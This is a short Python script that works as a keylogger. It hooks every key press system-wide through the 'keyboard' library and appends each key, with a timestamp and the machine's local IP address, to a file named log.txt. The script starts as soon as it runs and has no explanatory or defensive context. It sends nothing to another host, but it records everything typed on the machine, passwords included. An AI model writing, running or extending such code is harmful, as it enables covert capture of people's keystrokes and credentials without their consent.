import keyboard as kb
import time
import socket

def get_ip_address():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address

def keylog():
  log_f = open("log.txt", 'a')
  log_f.write("\n\n----------------------\n")
  log_f.write(f"({get_ip_address()})\n\n")

  def on_press(key):
    curr_time_since_epoch = time.time()
    curr_time = time.ctime(curr_time_since_epoch)
    log_f.write(str(curr_time) + " : " + str(key.name) + "\n")
    log_f.flush() 

  kb.on_press(on_press)
  kb.wait()

  log_f.close()

keylog()